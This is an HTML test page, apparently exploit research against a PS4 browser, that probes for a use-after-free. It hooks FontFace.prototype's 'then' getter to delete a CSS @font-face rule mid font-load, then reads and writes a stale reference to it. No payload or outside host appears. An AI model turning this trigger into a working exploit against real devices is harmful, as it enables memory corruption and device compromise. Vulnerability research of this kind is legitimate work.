<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phase 3 — Deleted rule reference</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
#status { font-size: 18px; margin-bottom: 8px; }
#log { height: 75vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
#t { font-family: x; font-size: 120px; color: #fff; }
</style>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="status">deleted rule ref probe...</div>
<div id="log"></div>
<div id="t">B</div>
<script>
(function () {
    var logEl = document.getElementById('log');
    var statusEl = document.getElementById('status');
    window.ps4log = function (msg) {
        var line = document.createElement('div');
        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
        logEl.appendChild(line);
    };
    window.ps4status = function (msg, color) {
        statusEl.textContent = msg;
        if (color) statusEl.style.color = color;
    };
})();

function probeRule(label, sheet) {
    ps4log('--- ' + label + ' cssRules.length=' + sheet.cssRules.length + ' ---');
    try {
        for (var i = 0; i < sheet.cssRules.length; i++) {
            var r = sheet.cssRules[i];
            ps4log('  rule[' + i + '] type=' + r.type + ' cssText=' + r.cssText.substring(0, 60));
        }
    } catch (e) {
        ps4log('  cssRules access: ' + e);
    }
}

function probeHeldRule(label, rule) {
    ps4log('--- held rule: ' + label + ' ---');
    if (!rule) { ps4log('  null'); return; }
    try { ps4log('  cssText=' + rule.cssText); } catch (e) { ps4log('  cssText: ' + e); }
    try { ps4log('  style.fontFamily=' + rule.style.fontFamily); } catch (e) { ps4log('  style: ' + e); }
    try { ps4log('  style.src=' + rule.style.src); } catch (e) { ps4log('  src: ' + e); }
}

window.onload = function () {
    ps4log('Phase 3e — deleted rule reference probe');
    ps4log('UA: ' + navigator.userAgent);

    var sheet = document.getElementById('s').sheet;
    var heldRule = sheet.cssRules[0];
    ps4log('held reference to cssRules[0] before trigger');
    probeRule('before', sheet);
    probeHeldRule('before', heldRule);

    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function () {
            if (!fired && this === A) {
                fired = true;
                ps4log('TRIGGER — deleteRule(0)');
                sheet.deleteRule(0);
                probeRule('inside trigger', sheet);
                probeHeldRule('inside trigger (stale ref?)', heldRule);
                document.getElementById('t').textContent = 'B';
                document.body.offsetTop;
            }
            return undefined;
        }
    });

    document.fonts.load('1em x', 'AB');

    setTimeout(function () {
        probeRule('after 500ms', sheet);
        probeHeldRule('after 500ms (stale ref?)', heldRule);
        ps4log('check(B)=' + document.fonts.check('1em x', 'B'));
        ps4log('render B offset=' + document.getElementById('t').offsetWidth);

        // mutate held rule if still accessible?
        try {
            heldRule.style.fontFamily = 'y';
            ps4log('heldRule.style.fontFamily write OK');
        } catch (e) {
            ps4log('heldRule write: ' + e);
        }

        ps4status('done', '#0f0');
    }, 500);
};
</script>
</body>
</html>
